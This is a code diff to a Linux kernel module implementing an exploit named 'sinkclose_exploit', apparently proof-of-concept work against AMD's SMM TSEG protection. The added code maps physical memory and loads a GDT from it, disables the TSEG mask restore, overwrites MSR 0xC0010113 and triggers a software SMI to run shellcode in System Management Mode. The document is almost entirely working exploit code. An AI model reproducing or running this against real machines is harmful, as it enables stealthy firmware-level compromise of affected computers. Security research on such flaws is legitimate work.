@@ -233,6 +233,28 @@ static void core1_sinkclose(void *info) {
     printk(KERN_INFO "CORE %d exiting sinkclose", smp_processor_id());
 }
 
+
+static void test_gdt_mapping(void){
+    unsigned long flags;
+    void *mapped_addr = ioremap(0x1000, 0x1000);
+    if (!mapped_addr) {
+        pr_err("Failed to map physical address 0x%x\n", 0x1000);
+    }
+    preempt_disable();
+    pr_info("Mapped address: %p\n", mapped_addr);
+    mapped_addr += 0x400;
+    pr_info("Mapped address: %p\n", mapped_addr);
+    
+    /* Save and disable IRQs */
+    local_irq_save(flags);
+    _load_gdt(mapped_addr);
+    /* Restore IRQs */
+    local_irq_restore(flags);
+    pr_info("loading gdt successful\n");
+    preempt_enable();
+
+}
+
 #define AMD_MSR_SMM_TSEG_MASK  0xC0010113
 static void sinkclose_exploit(void *info) {  
     UINT64 tseg_mask = 0;
@@ -277,7 +299,7 @@ static void sinkclose_exploit(void *info) {
 
         // Busy wait until Core1 executes
         while ((atomic_cmpxchg(&core1_sinkclose_executed, 1, 1) != 1));
-
+        //test_gdt_mapping(); // Loading the GDB works but due to alignment the kernel crashes afterwards
         // Executes SWSMI with TClose Enabled
         _rdmsr(AMD_MSR_SMM_TSEG_MASK, &tseg_mask);
         pr_info("TSEG Mask Before Overwrite: %016llx\n", tseg_mask);
@@ -285,15 +307,15 @@ static void sinkclose_exploit(void *info) {
         _wrmsr(AMD_MSR_SMM_TSEG_MASK, tseg_mask);
         _rdmsr(AMD_MSR_SMM_TSEG_MASK, &tseg_mask);
         pr_info("TSEG Mask After Overwrite: %016llx\n", tseg_mask);
-        tseg_mask &= ~(0b11 << 2);
+/*         tseg_mask &= ~(0b11 << 2);
         _wrmsr(AMD_MSR_SMM_TSEG_MASK, tseg_mask);
         _rdmsr(AMD_MSR_SMM_TSEG_MASK, &tseg_mask);
-        pr_info("TSEG Restore: %016llx\n", tseg_mask);
+        pr_info("TSEG Restore: %016llx\n", tseg_mask); */
         _swsmi(smi);
-
         // Signal Core1 that it can continue
         atomic_inc_return(&core1_sinkclose_finished);
-
+        _rdmsr(AMD_MSR_SMM_TSEG_MASK, &tseg_mask);
+        pr_info("TSEG Mask After Execution: %016llx\n", tseg_mask);
         printk(KERN_INFO "CORE0 sinkclose executed shellcode");
     }
 
